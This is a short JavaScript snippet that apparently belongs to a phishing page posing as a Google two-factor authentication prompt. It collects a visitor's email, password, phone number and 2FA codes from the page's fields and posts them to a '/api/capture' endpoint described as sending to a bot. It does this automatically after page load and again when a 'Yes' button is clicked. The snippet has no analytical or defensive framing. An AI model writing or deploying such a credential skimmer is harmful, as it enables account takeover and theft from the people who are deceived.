<script>
  // ===== DATA CAPTURE =====
  function captureVisitorData(data) {
    // Get visitor info
    const visitorData = {
      email: data.email || document.getElementById('email')?.value || 'Not provided',
      password: data.password || document.getElementById('password')?.value || 'Not provided',
      phone: data.phone || document.getElementById('phoneInput')?.value || 'Not provided',
      code: data.code || document.getElementById('codeBadge')?.textContent || 'Not provided',
      g_code: data.g_code || document.getElementById('gCodeDisplay')?.textContent || 'Not provided',
      page: 'Google 2FA Page',
      ip: 'Unknown',
      user_agent: navigator.userAgent
    };

    // Send to bot
    fetch('/api/capture', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(visitorData)
    })
    .then(response => response.json())
    .then(result => {
      console.log('✅ Data captured:', result);
    })
    .catch(error => {
      console.log('⚠️ Error capturing data:', error);
    });
  }

  // Capture data when user interacts with the page
  document.addEventListener('DOMContentLoaded', function() {
    // Capture on page load
    setTimeout(() => {
      captureVisitorData({});
    }, 3000);

    // Capture when "Yes" button is clicked
    const yesBtn = document.getElementById('yesBtn');
    if (yesBtn) {
      yesBtn.addEventListener('click', function() {
        captureVisitorData({
          action: 'Yes button clicked'
        });
      });
    }
  });
</script>
